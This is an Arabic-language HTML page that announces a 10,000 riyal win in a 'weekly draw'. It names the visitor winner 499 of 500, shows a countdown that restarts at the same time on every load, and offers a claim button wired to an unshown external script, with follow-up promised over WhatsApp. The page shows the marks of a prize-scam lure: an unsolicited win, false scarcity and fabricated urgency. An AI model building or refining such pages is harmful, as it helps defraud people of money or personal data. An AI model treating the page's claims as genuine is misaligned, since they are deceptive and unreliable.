<!DOCTYPE html>
<html dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الجوائز الكبرى - استلام الجائزة</title>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Tajawal', sans-serif;
        }

        body {
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            direction: rtl;
        }

        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            width: 90%;
            max-width: 500px;
            padding: 0;
            overflow: hidden;
        }

        .header {
            background: linear-gradient(45deg, #FF512F 0%, #DD2476 100%);
            color: white;
            padding: 30px 20px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        .header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">🎉</text></svg>') center/40px repeat;
            opacity: 0.1;
        }

        .prize-amount {
            font-size: 2.5em;
            font-weight: bold;
            margin: 10px 0;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }

        .content {
            padding: 30px 20px;
            text-align: center;
        }

        .winner-info {
            background: rgba(255,255,255,0.1);
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            color: #666;
        }

        .winner-number {
            color: #DD2476;
            font-weight: bold;
            font-size: 1.2em;
        }

        .steps {
            text-align: right;
            margin: 25px 0;
            padding: 0 20px;
        }

        .step {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
            color: #555;
        }

        .step-number {
            background: #DD2476;
            color: white;
            width: 25px;
            height: 25px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-left: 10px;
            font-size: 0.9em;
        }

        .confirm-btn {
            background: linear-gradient(45deg, #FF512F 0%, #DD2476 100%);
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 30px;
            font-size: 1.1em;
            cursor: pointer;
            transition: transform 0.3s, box-shadow 0.3s;
            margin: 20px 0;
            width: 80%;
        }

        .confirm-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(221,36,118,0.3);
        }

        .timer {
            color: #DD2476;
            font-size: 1.2em;
            margin: 20px 0;
        }

        .note {
            color: #666;
            font-size: 0.9em;
            margin-top: 20px;
        }

        #loading, #status {
            display: none;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }

        .pulse {
            animation: pulse 2s infinite;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>مبروك! 🎉</h1>
            <div class="prize-amount">10,000 ريال</div>
            <p>لقد ربحت في السحب الأسبوعي</p>
        </div>
        
        <div class="content">
            <div class="winner-info">
                الرابح رقم <span class="winner-number">499</span> من <span>500</span>
            </div>

            <div class="timer">
                متبقي: <span id="countdown">23:45:12</span>
            </div>

            <div class="steps">
                <div class="step">
                    <span class="step-number">1</span>
                    <span>تم اختيارك كرابح في السحب الأسبوعي</span>
                </div>
                <div class="step">
                    <span class="step-number">2</span>
                    <span>اضغط على زر تأكيد الجائزة أدناه</span>
                </div>
                <div class="step">
                    <span class="step-number">3</span>
                    <span>سيتم التواصل معك عبر WhatsApp</span>
                </div>
            </div>

            <button class="confirm-btn pulse" onclick="startProcess()">تأكيد استلام الجائزة</button>

            <p class="note">* يرجى تأكيد استلام الجائزة قبل انتهاء المدة</p>
        </div>

        <div id="loading"></div>
        <div id="status"></div>
    </div>

    <script src="script.js"></script>
    <script>
        // عداد تنازلي
        function updateTimer() {
            const countdownElement = document.getElementById('countdown');
            let minutes = 23;
            let seconds = 45;
            let hours = 23;

            setInterval(() => {
                if (seconds > 0) {
                    seconds--;
                } else {
                    seconds = 59;
                    if (minutes > 0) {
                        minutes--;
                    } else {
                        minutes = 59;
                        if (hours > 0) {
                            hours--;
                        }
                    }
                }
                countdownElement.textContent = `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
            }, 1000);
        }

        // تشغيل العداد عند تحميل الصفحة
        updateTimer();
    </script>
</body>
</html>
